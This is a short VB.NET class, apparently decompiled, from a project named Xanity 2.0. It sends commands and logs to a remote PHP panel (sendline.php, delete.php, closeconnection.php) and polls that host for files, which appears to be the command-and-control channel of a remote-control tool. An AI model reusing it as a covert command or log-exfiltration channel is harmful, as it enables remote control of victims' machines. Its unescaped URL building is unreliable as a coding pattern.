Imports System
Imports System.IO
Imports System.Net

Namespace Xanity_2._0
    Public Class API
        ' Methods
        Public Function check(ByVal host As String) As Object
            Dim reader As New StreamReader(WebRequest.Create((host & "/main.txt")).GetResponse.GetResponseStream)
            Return reader.ReadToEnd
        End Function

        Public Function checkok(ByVal host As String, ByVal file As String) As Object
            Dim reader As New StreamReader(WebRequest.Create((host & "/" & file)).GetResponse.GetResponseStream)
            Return (reader.ReadToEnd = "ok")
        End Function

        Public Sub delcmd(ByVal host As String, ByVal file As String)
            WebRequest.Create((host & "/delete.php?file=" & file)).GetResponse
        End Sub

        Public Sub delete(ByVal host As String, ByVal Str As String, ByVal file As String)
            WebRequest.Create(String.Concat(New String() { host, "/closeconnection.php?string=", Str, "&file=", file })).GetResponse
        End Sub

        Public Function getlogs(ByVal host As String, ByVal file As String, ByVal suffix As String) As Object
            Dim reader As New StreamReader(WebRequest.Create(String.Concat(New String() { host, "/", file, suffix, ".txt" })).GetResponse.GetResponseStream)
            Return reader.ReadToEnd
        End Function

        Public Function sendcmd(ByVal msg As String, ByVal host As String, ByVal file As String) As Object
            Dim reader As New StreamReader(WebRequest.Create(String.Concat(New String() { host, "/sendline.php?message=", msg, "&file=", file })).GetResponse.GetResponseStream)
            Return reader.ReadToEnd.ToString.Contains("Data Written")
        End Function

        Public Function sendlogs(ByVal host As String, ByVal file As String, ByVal msg As String, ByVal suffix As String) As Object
            Dim reader As New StreamReader(WebRequest.Create(String.Concat(New String() { host, "/sendline.php?file=", file, suffix, ".txt&message=", msg })).GetResponse.GetResponseStream)
            Return reader.ReadToEnd.ToString.Contains("Data Written")
        End Function

    End Class
End Namespace

